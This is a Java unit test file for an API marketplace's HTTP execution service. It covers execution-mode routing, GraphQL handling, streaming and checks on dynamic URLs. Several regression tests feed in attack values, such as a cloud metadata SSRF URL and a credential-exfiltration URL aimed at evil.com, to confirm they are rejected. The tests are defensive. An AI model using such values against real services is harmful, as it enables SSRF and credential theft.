package com.apimarketplace.catalog.service.http;

import com.apimarketplace.catalog.domain.ApiEntity;
import com.apimarketplace.catalog.domain.ApiToolEntity;
import com.apimarketplace.catalog.repository.ApiToolParameterRepository;
import com.apimarketplace.catalog.service.UserCredentialService;
import com.apimarketplace.catalog.service.execution.StreamingResponseHandler;
import com.apimarketplace.common.security.CredentialEncryptionService;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.web.client.RestTemplate;

import java.lang.reflect.Field;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.*;

/**
 * Unit tests for the V52 typed-execution path of {@link HttpExecutionService}.
 *
 * <p>Covers the parts of {@code needsTypedExecutionPath} and {@code executeHttpCallTyped}
 * that were not exercised by the original {@link HttpExecutionServiceTest} suite (which
 * focused on the legacy sync/JSON path). Specifically:
 *
 * <ul>
 *   <li>{@link #needsTypedExecutionPath_decisionMatrix needsTypedExecutionPath} for every
 *       (mode, bodyType, responseType) combination plus the null/blank/malformed edge
 *       cases.</li>
 *   <li>The new fail-fast branches added by the V52 hardening pass:
 *       {@code mode=webhook} explicit reject, unknown mode explicit reject.</li>
 *   <li>The streaming dispatch path: missing handler bean → failure, present handler →
 *       its aggregated map is wrapped into the standard envelope.</li>
 * </ul>
 *
 * <p>The tests deliberately do NOT spin up a real HTTP server - they exercise the
 * fail-fast validation block that runs before any upstream call is issued.
 */
@ExtendWith(MockitoExtension.class)
@DisplayName("HttpExecutionService - V52 typed execution path")
class HttpExecutionServiceTypedPathTest {

    @Mock private ApiToolParameterRepository apiToolParameterRepository;
    @Mock private UserCredentialService userCredentialService;
    @Mock private CredentialEncryptionService encryptionService;
    @Mock private JdbcTemplate jdbcTemplate;
    @Mock private RestTemplate restTemplate;
    @Mock private StreamingResponseHandler streamingResponseHandler;

    private ObjectMapper objectMapper;
    private HttpExecutionService service;

    @BeforeEach
    void setUp() {
        objectMapper = new ObjectMapper();
        lenient().when(encryptionService.decrypt(any())).thenAnswer(inv -> inv.getArgument(0));
        service = new HttpExecutionService(
                apiToolParameterRepository, userCredentialService, encryptionService,
                objectMapper, jdbcTemplate, restTemplate);
    }

    /** Inject the streamingResponseHandler field via reflection (it's @Autowired(required=false)). */
    private void injectStreamingHandler(StreamingResponseHandler handler) {
        try {
            Field f = HttpExecutionService.class.getDeclaredField("streamingResponseHandler");
            f.setAccessible(true);
            f.set(service, handler);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private ApiEntity api() {
        ApiEntity api = new ApiEntity();
        api.setBaseUrl("https://upstream.example.com");
        return api;
    }

    private ApiToolEntity tool(String executionSpecJson) {
        ApiToolEntity t = new ApiToolEntity();
        t.setMethod("POST");
        t.setEndpoint("/v1/anything");
        t.setExecutionSpec(executionSpecJson);
        t.setOutputSchema("[]");
        return t;
    }

    // ─────────────────────────────────────────────────────────────────────────
    // needsTypedExecutionPath decision matrix
    // ─────────────────────────────────────────────────────────────────────────

    @Nested
    @DisplayName("needsTypedExecutionPath()")
    class NeedsTypedExecutionPath {

        @Test
        @DisplayName("null execution_spec → false (legacy path)")
        void nullSpec() {
            assertThat(service.needsTypedExecutionPath(tool(null))).isFalse();
        }

        @Test
        @DisplayName("blank execution_spec → false")
        void blankSpec() {
            assertThat(service.needsTypedExecutionPath(tool("   "))).isFalse();
        }

        @Test
        @DisplayName("malformed JSON → false (graceful degradation to legacy path)")
        void malformedJson() {
            assertThat(service.needsTypedExecutionPath(tool("{not json"))).isFalse();
        }

        @Test
        @DisplayName("sync + json + json → false")
        void syncJsonJson() {
            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"json\"},\"response\":{\"type\":\"json\"}}";
            assertThat(service.needsTypedExecutionPath(tool(spec))).isFalse();
        }

        @Test
        @DisplayName("sync + multipart → true (multipart needs typed encoder)")
        void syncMultipart() {
            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"multipart\"},\"response\":{\"type\":\"json\"}}";
            assertThat(service.needsTypedExecutionPath(tool(spec))).isTrue();
        }

        @Test
        @DisplayName("sync + multipart_related → true (Google media uploads need typed encoder)")
        void syncMultipartRelated() {
            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"multipart_related\"},\"response\":{\"type\":\"json\"}}";
            assertThat(service.needsTypedExecutionPath(tool(spec))).isTrue();
        }

        @Test
        @DisplayName("sync + binary response → true (binary needs typed handler)")
        void syncBinary() {
            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"json\"},\"response\":{\"type\":\"binary\"}}";
            assertThat(service.needsTypedExecutionPath(tool(spec))).isTrue();
        }

        @Test
        @DisplayName("async_poll → true")
        void asyncPoll() {
            String spec = "{\"mode\":\"async_poll\",\"request\":{\"bodyType\":\"json\"},\"response\":{\"type\":\"json\"}}";
            assertThat(service.needsTypedExecutionPath(tool(spec))).isTrue();
        }

        @Test
        @DisplayName("streaming → true (routes to typed path which dispatches to streaming handler)")
        void streaming() {
            String spec = "{\"mode\":\"streaming\",\"request\":{\"bodyType\":\"json\"},\"response\":{\"type\":\"json\"}}";
            assertThat(service.needsTypedExecutionPath(tool(spec))).isTrue();
        }

        @Test
        @DisplayName("upload → true")
        void upload() {
            String spec = "{\"mode\":\"upload\",\"request\":{\"bodyType\":\"json\"},\"response\":{\"type\":\"json\"}}";
            assertThat(service.needsTypedExecutionPath(tool(spec))).isTrue();
        }

        @Test
        @DisplayName("raw_binary bodyType → true (V145 routes to typed encoder)")
        void rawBinary() {
            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"raw_binary\"},\"response\":{\"type\":\"json\"}}";
            // V145: raw_binary now correctly routes to the typed path so RawBinaryBodyEncoder
            // is invoked instead of the legacy JSON serializer.
            assertThat(service.needsTypedExecutionPath(tool(spec))).isTrue();
        }

        @Test
        @DisplayName("graphql bodyType → true (V145 P0 regression - must NOT bypass GraphqlBodyEncoder)")
        void graphqlBodyTypeRoutesToTypedPath() {
            // P0 regression: before V145, needsTypedExecutionPath returned false for
            // mode=sync + bodyType=graphql, which silently routed to the legacy
            // JSON serializer and never invoked GraphqlBodyEncoder. The fix added
            // graphql/form_urlencoded/raw_binary to the typed-path dispatch list.
            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"graphql\",\"graphql\":{\"query\":\"query Q { __typename }\"}},\"response\":{\"type\":\"json\"}}";
            assertThat(service.needsTypedExecutionPath(tool(spec))).isTrue();
        }

        @Test
        @DisplayName("form_urlencoded bodyType → true (V145 routes to typed encoder)")
        void formUrlencodedRoutesToTypedPath() {
            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"form_urlencoded\"},\"response\":{\"type\":\"json\"}}";
            assertThat(service.needsTypedExecutionPath(tool(spec))).isTrue();
        }

        @Test
        @DisplayName("missing mode field → defaults to sync → false (when also json/json)")
        void missingMode() {
            String spec = "{\"request\":{\"bodyType\":\"json\"},\"response\":{\"type\":\"json\"}}";
            assertThat(service.needsTypedExecutionPath(tool(spec))).isFalse();
        }
    }

    // ─────────────────────────────────────────────────────────────────────────
    // executeHttpCallTyped - V52 fail-fast branches
    // ─────────────────────────────────────────────────────────────────────────

    @Nested
    @DisplayName("executeHttpCallTyped() - V52 fail-fast branches")
    class ExecuteHttpCallTypedFailFast {

        @Test
        @DisplayName("mode=webhook → falls through to unknown mode rejection (V145)")
        void webhookNowRejectedAsUnknownMode() {
            // V145 retired the webhook mode. The dedicated `if ("webhook".equals(mode))`
            // guard was removed; webhook now hits the generic "unknown mode" branch.
            String spec = "{\"mode\":\"webhook\",\"request\":{\"bodyType\":\"json\"},\"response\":{\"type\":\"json\"}}";
            ApiToolEntity tool = tool(spec);

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, objectMapper.createObjectNode(),
                    new HashSet<>(), "user-1", null, "tenant-1");

            assertThat(result).isNotNull();
            assertThat(result.get("success")).isEqualTo(false);
            assertThat(result.get("error")).asString().contains("webhook").contains("Unknown");
            // No HTTP call must have been issued.
            verifyNoInteractions(restTemplate);
        }

        // ── Dynamic-URL endpoint constraints (enforceDynamicUrlConstraints) ──
        // When the endpoint path IS a {placeholder} (TikTok upload_url, WhatsApp
        // media_url), the request host comes from a runtime parameter. All rejects
        // must happen BEFORE any outbound call. Fixed-host endpoints are untouched,
        // which the green legacy tests of this class pin (their host would fail DNS).

        private ApiToolEntity dynamicUrlTool(String allowedSuffixesJson) {
            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"json\""
                    + (allowedSuffixesJson != null ? ",\"allowedUrlHostSuffixes\":" + allowedSuffixesJson : "")
                    + "},\"response\":{\"type\":\"json\"}}";
            ApiToolEntity tool = tool(spec);
            tool.setMethod("PUT");
            tool.setEndpoint("{upload_url}");
            return tool;
        }

        private com.fasterxml.jackson.databind.node.ArrayNode uploadUrlParam(String value) {
            com.fasterxml.jackson.databind.node.ArrayNode parameters = objectMapper.createArrayNode();
            parameters.add(objectMapper.createObjectNode().put("upload_url", value));
            return parameters;
        }

        @Test
        @DisplayName("dynamic-URL + internal-address param → SSRF-rejected, no HTTP call")
        void dynamicUrlEndpointRejectsInternalAddress() {
            // Suffix matches the value's host so the reject is proven to come from the
            // SSRF layer (private-range check), not from host pinning.
            ApiToolEntity tool = dynamicUrlTool("[\"169.254.169.254\"]");

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, uploadUrlParam("http://169.254.169.254/latest/meta-data/"),
                    new HashSet<>(Set.of("upload_url")), "user-1", null, "tenant-1");

            assertThat(result.get("success")).isEqualTo(false);
            assertThat(result.get("error")).asString()
                    .contains("private/internal network addresses are not allowed");
            verifyNoInteractions(restTemplate);
        }

        /**
         * Credential-exfiltration regression: a value like "https://{api_key}.evil.com/"
         * passes a naive SSRF check (the validator skips DNS on templated hosts) and
         * would then have the user's secret substituted into it by
         * replaceUrlTemplateVariables further down the flow. Any residual '{' in a
         * dynamic URL must be rejected before that substitution can ever happen.
         */
        @Test
        @DisplayName("dynamic-URL + residual {placeholder} in value → rejected (credential-exfil regression)")
        void dynamicUrlRejectsResidualPlaceholders() {
            ApiToolEntity tool = dynamicUrlTool("[\"evil.com\"]");

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, uploadUrlParam("https://{api_key}.evil.com/collect"),
                    new HashSet<>(Set.of("upload_url")), "user-1", null, "tenant-1");

            assertThat(result.get("success")).isEqualTo(false);
            assertThat(result.get("error")).asString().contains("unresolved placeholders");
            verifyNoInteractions(restTemplate);
        }

        @Test
        @DisplayName("dynamic-URL + host outside the endpoint allow-list → rejected before any DNS")
        void dynamicUrlRejectsHostOutsideAllowList() {
            ApiToolEntity tool = dynamicUrlTool("[\"tiktokapis.com\"]");

            // attacker.invalid does not resolve: reaching the pinning error (not a DNS
            // error) proves the allow-list runs BEFORE any DNS resolution.
            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, uploadUrlParam("https://attacker.invalid/collect"),
                    new HashSet<>(Set.of("upload_url")), "user-1", null, "tenant-1");

            assertThat(result.get("success")).isEqualTo(false);
            assertThat(result.get("error")).asString().contains("not among the endpoint's allowed hosts");
            verifyNoInteractions(restTemplate);
        }

        @Test
        @DisplayName("dynamic-URL endpoint without allowedUrlHostSuffixes → refused (fail-closed)")
        void dynamicUrlWithoutAllowListIsRefused() {
            ApiToolEntity tool = dynamicUrlTool(null);

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, uploadUrlParam("https://open-upload.tiktokapis.com/video/?upload_id=1"),
                    new HashSet<>(Set.of("upload_url")), "user-1", null, "tenant-1");

            assertThat(result.get("success")).isEqualTo(false);
            assertThat(result.get("error")).asString().contains("allowedUrlHostSuffixes");
            verifyNoInteractions(restTemplate);
        }

        @Test
        @DisplayName("dynamic-URL + missing URL param → clear 'unresolved placeholders' failure")
        void dynamicUrlMissingParamFailsClearly() {
            ApiToolEntity tool = dynamicUrlTool("[\"tiktokapis.com\"]");

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, objectMapper.createArrayNode(),
                    new HashSet<>(Set.of("upload_url")), "user-1", null, "tenant-1");

            assertThat(result.get("success")).isEqualTo(false);
            assertThat(result.get("error")).asString().contains("unresolved placeholders");
            verifyNoInteractions(restTemplate);
        }

        /**
         * Happy path: an allow-listed signed URL must reach the HTTP client
         * BYTE-IDENTICAL - query string intact, nothing re-encoded, no credential
         * template substituted. This is the integration seam where the URL could
         * silently mutate between validation and the outbound request.
         */
        @Test
        @DisplayName("dynamic-URL happy path → signed URI reaches the HTTP client byte-identical")
        void dynamicUrlHappyPathSendsSignedUriVerbatim() {
            ApiToolEntity tool = dynamicUrlTool("[\"tiktokapis.com\"]");

            com.apimarketplace.catalog.domain.ApiToolParameterEntity verbatimParam =
                    new com.apimarketplace.catalog.domain.ApiToolParameterEntity();
            verbatimParam.setName("upload_url");
            verbatimParam.setParameterType("path");
            verbatimParam.setDataType("string");
            verbatimParam.setExtras("{\"encoding\":\"verbatim\"}");
            when(apiToolParameterRepository.findByApiToolId(tool.getId()))
                    .thenReturn(java.util.List.of(verbatimParam));

            String signedUrl = "https://open-upload.tiktokapis.com/video/?upload_id=v1.123&upload_token=Xza%2F1";
            org.springframework.http.ResponseEntity<Object> resp =
                    new org.springframework.http.ResponseEntity<>(
                            new java.util.HashMap<>(), org.springframework.http.HttpStatus.OK);
            when(restTemplate.exchange(any(java.net.URI.class), any(HttpMethod.class),
                    any(), eq(Object.class))).thenReturn(resp);

            // Static-mock the SSRF validator (prior art in HttpExecutionServiceTest):
            // unit tests must not depend on live DNS for tiktokapis.com. Pinning and
            // placeholder checks stay REAL - only the DNS-resolving layer is stubbed.
            try (org.mockito.MockedStatic<com.apimarketplace.common.web.UrlSafetyValidator> urlValidator =
                         org.mockito.Mockito.mockStatic(com.apimarketplace.common.web.UrlSafetyValidator.class)) {
                urlValidator.when(() -> com.apimarketplace.common.web.UrlSafetyValidator
                        .validateUrl(org.mockito.ArgumentMatchers.anyString())).thenAnswer(inv -> null);

                Map<String, Object> result = service.executeHttpCallTyped(
                        api(), tool, uploadUrlParam(signedUrl),
                        new HashSet<>(Set.of("upload_url")), "user-1", null, "tenant-1");

                assertThat(result.get("success")).isEqualTo(true);
            }

            org.mockito.ArgumentCaptor<java.net.URI> uriCaptor =
                    org.mockito.ArgumentCaptor.forClass(java.net.URI.class);
            verify(restTemplate).exchange(uriCaptor.capture(), eq(HttpMethod.PUT), any(), eq(Object.class));
            assertThat(uriCaptor.getValue().toString()).isEqualTo(signedUrl);
        }

        @Test
        @DisplayName("mode=foo (unknown) → fail-fast with explicit message")
        void unknownModeRejected() {
            String spec = "{\"mode\":\"foo\",\"request\":{\"bodyType\":\"json\"},\"response\":{\"type\":\"json\"}}";
            ApiToolEntity tool = tool(spec);

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, objectMapper.createObjectNode(),
                    new HashSet<>(), "user-1", null, "tenant-1");

            assertThat(result.get("success")).isEqualTo(false);
            assertThat(result.get("error")).asString().contains("Unknown execution.mode")
                    .contains("foo");
            verifyNoInteractions(restTemplate);
        }

        @Test
        @DisplayName("mode=streaming + handler bean missing → graceful failure (not NPE)")
        void streamingWithoutHandler() {
            String spec = "{\"mode\":\"streaming\",\"request\":{\"bodyType\":\"json\"},\"response\":{\"type\":\"json\"}}";
            ApiToolEntity tool = tool(spec);
            // Do NOT inject the handler - simulate the field staying null in tests.

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, objectMapper.createObjectNode(),
                    new HashSet<>(), "user-1", null, "tenant-1");

            assertThat(result.get("success")).isEqualTo(false);
            assertThat(result.get("error")).asString().contains("Streaming response handler");
        }

        @Test
        @DisplayName("mode=streaming + handler present → handler invoked, result wrapped in envelope")
        void streamingWithHandler() {
            String spec = "{\"mode\":\"streaming\",\"request\":{\"bodyType\":\"json\"},\"response\":{\"type\":\"json\"}}";
            ApiToolEntity tool = tool(spec);

            // The handler returns a synthetic aggregated map that mimics what the real
            // StreamingResponseHandler would return after consuming an SSE stream.
            Map<String, Object> aggregated = Map.of(
                    "chunks", java.util.List.of(Map.of("text", "hi")),
                    "chunk_count", 1,
                    "terminated", true,
                    "truncated", false
            );
            when(streamingResponseHandler.handle(
                    any(String.class), any(HttpMethod.class), any(HttpHeaders.class), any()))
                    .thenReturn(aggregated);
            injectStreamingHandler(streamingResponseHandler);

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, objectMapper.createObjectNode(),
                    new HashSet<>(), "user-1", null, "tenant-1");

            assertThat(result.get("success")).isEqualTo(true);
            assertThat(result.get("data")).isEqualTo(aggregated);
            // No upstream HTTP call via RestTemplate - streaming uses WebClient via the handler.
            verifyNoInteractions(restTemplate);
        }

        // ────────────────────────────────────────────────────────────────────
        // V145 - bodyType=graphql branch (encoder + auto-unwrap of {data, errors})
        // ────────────────────────────────────────────────────────────────────

        /** Inject the GraphqlBodyEncoder (autowired field). */
        private void injectGraphqlEncoder(com.apimarketplace.catalog.service.execution.GraphqlBodyEncoder enc) {
            try {
                Field f = HttpExecutionService.class.getDeclaredField("graphqlBodyEncoder");
                f.setAccessible(true);
                f.set(service, enc);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }

        @Test
        @DisplayName("graphql with missing query → fail-fast with explicit message, no upstream call")
        void graphqlMissingQueryFails() {
            // No 'query' inside the graphql sub-block.
            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"graphql\",\"graphql\":{}},\"response\":{\"type\":\"json\"}}";
            ApiToolEntity tool = tool(spec);
            injectGraphqlEncoder(new com.apimarketplace.catalog.service.execution.GraphqlBodyEncoder(objectMapper));

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, objectMapper.createObjectNode(),
                    new HashSet<>(), "user-1", null, "tenant-1");

            assertThat(result.get("success")).isEqualTo(false);
            assertThat(result.get("error")).asString()
                    .contains("execution.request.graphql.query")
                    .contains("required");
            verifyNoInteractions(restTemplate);
        }

        @Test
        @DisplayName("graphql 200 + {data:{...}} → auto-unwrap to data, success=true")
        void graphqlAutoUnwrapsDataField() {
            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"graphql\"," +
                    "\"graphql\":{\"query\":\"query Q { user { id } }\"}}," +
                    "\"response\":{\"type\":\"json\"}}";
            ApiToolEntity tool = tool(spec);
            injectGraphqlEncoder(new com.apimarketplace.catalog.service.execution.GraphqlBodyEncoder(objectMapper));

            // Upstream returns the standard GraphQL envelope.
            Map<String, Object> envelope = new java.util.HashMap<>();
            envelope.put("data", Map.of("user", Map.of("id", "u-1")));
            org.springframework.http.ResponseEntity<Object> resp =
                    new org.springframework.http.ResponseEntity<>(envelope, org.springframework.http.HttpStatus.OK);
            when(restTemplate.exchange(any(java.net.URI.class), any(HttpMethod.class),
                    any(), eq(Object.class))).thenReturn(resp);

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, objectMapper.createObjectNode(),
                    new HashSet<>(), "user-1", null, "tenant-1");

            assertThat(result.get("success")).isEqualTo(true);
            // 'data' must be the inner data field, NOT the full envelope.
            assertThat(result.get("data")).isEqualTo(Map.of("user", Map.of("id", "u-1")));
        }

        @Test
        @DisplayName("graphql 200 + non-empty errors[] → success=false, status=0, errors serialized")
        void graphqlErrorsArrayMarksFailureWithStatusZero() {
            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"graphql\"," +
                    "\"graphql\":{\"query\":\"query Q { __typename }\"}}," +
                    "\"response\":{\"type\":\"json\"}}";
            ApiToolEntity tool = tool(spec);
            injectGraphqlEncoder(new com.apimarketplace.catalog.service.execution.GraphqlBodyEncoder(objectMapper));

            Map<String, Object> envelope = new java.util.HashMap<>();
            envelope.put("data", null);
            envelope.put("errors", java.util.List.of(
                    Map.of("message", "FORBIDDEN", "extensions", Map.of("code", "AUTH"))));
            org.springframework.http.ResponseEntity<Object> resp =
                    new org.springframework.http.ResponseEntity<>(envelope, org.springframework.http.HttpStatus.OK);
            when(restTemplate.exchange(any(java.net.URI.class), any(HttpMethod.class),
                    any(), eq(Object.class))).thenReturn(resp);

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, objectMapper.createObjectNode(),
                    new HashSet<>(), "user-1", null, "tenant-1");

            assertThat(result.get("success")).isEqualTo(false);
            assertThat(result.get("status")).isEqualTo(0);
            assertThat(result.get("error")).asString()
                    .contains("GraphQL errors")
                    .contains("FORBIDDEN");
        }

        @Test
        @DisplayName("graphql 200 + non-Map body (proxy HTML) → passthrough, no auto-unwrap, no cast")
        void graphqlNonMapResponseStaysPassthrough() {
            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"graphql\"," +
                    "\"graphql\":{\"query\":\"query Q { __typename }\"}}," +
                    "\"response\":{\"type\":\"json\"}}";
            ApiToolEntity tool = tool(spec);
            injectGraphqlEncoder(new com.apimarketplace.catalog.service.execution.GraphqlBodyEncoder(objectMapper));

            // Upstream proxy returned an HTML error page in the body - not a Map. The unwrap
            // logic must not throw a ClassCastException; it should leave the body untouched.
            org.springframework.http.ResponseEntity<Object> resp =
                    new org.springframework.http.ResponseEntity<>("<html>oops</html>", org.springframework.http.HttpStatus.OK);
            when(restTemplate.exchange(any(java.net.URI.class), any(HttpMethod.class),
                    any(), eq(Object.class))).thenReturn(resp);

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, objectMapper.createObjectNode(),
                    new HashSet<>(), "user-1", null, "tenant-1");

            assertThat(result.get("success")).isEqualTo(true);
            assertThat(result.get("data")).isEqualTo("<html>oops</html>");
        }

        @Test
        @DisplayName("graphql 200 + data and non-empty errors → fail (errors win, partial-success rejected)")
        void graphqlPartialSuccessWithDataAndErrorsFails() {
            String spec = "{\"mode\":\"sync\",\"request\":{\"bodyType\":\"graphql\"," +
                    "\"graphql\":{\"query\":\"query Q { __typename }\"}}," +
                    "\"response\":{\"type\":\"json\"}}";
            ApiToolEntity tool = tool(spec);
            injectGraphqlEncoder(new com.apimarketplace.catalog.service.execution.GraphqlBodyEncoder(objectMapper));

            Map<String, Object> envelope = new java.util.HashMap<>();
            envelope.put("data", Map.of("user", Map.of("id", "u-1")));
            envelope.put("errors", java.util.List.of(Map.of("message", "field 'email' deprecated")));
            org.springframework.http.ResponseEntity<Object> resp =
                    new org.springframework.http.ResponseEntity<>(envelope, org.springframework.http.HttpStatus.OK);
            when(restTemplate.exchange(any(java.net.URI.class), any(HttpMethod.class),
                    any(), eq(Object.class))).thenReturn(resp);

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, objectMapper.createObjectNode(),
                    new HashSet<>(), "user-1", null, "tenant-1");

            // Even though `data` is present, any non-empty errors[] surfaces as failure.
            assertThat(result.get("success")).isEqualTo(false);
            assertThat(result.get("error")).asString().contains("deprecated");
        }

        @Test
        @DisplayName("mode=streaming + handler returns error → success=false, error propagated")
        void streamingWithHandlerError() {
            String spec = "{\"mode\":\"streaming\",\"request\":{\"bodyType\":\"json\"},\"response\":{\"type\":\"json\"}}";
            ApiToolEntity tool = tool(spec);

            Map<String, Object> aggregatedWithError = new java.util.HashMap<>();
            aggregatedWithError.put("chunks", java.util.List.of());
            aggregatedWithError.put("chunk_count", 0);
            aggregatedWithError.put("terminated", false);
            aggregatedWithError.put("truncated", false);
            aggregatedWithError.put("error", "HTTP 500: upstream exploded");
            when(streamingResponseHandler.handle(
                    any(String.class), any(HttpMethod.class), any(HttpHeaders.class), any()))
                    .thenReturn(aggregatedWithError);
            injectStreamingHandler(streamingResponseHandler);

            Map<String, Object> result = service.executeHttpCallTyped(
                    api(), tool, objectMapper.createObjectNode(),
                    new HashSet<>(), "user-1", null, "tenant-1");

            assertThat(result.get("success")).isEqualTo(false);
            // The aggregated map is still surfaced in 'data' so the projector can see partials.
            assertThat(result.get("data")).isEqualTo(aggregatedWithError);
        }
    }
}
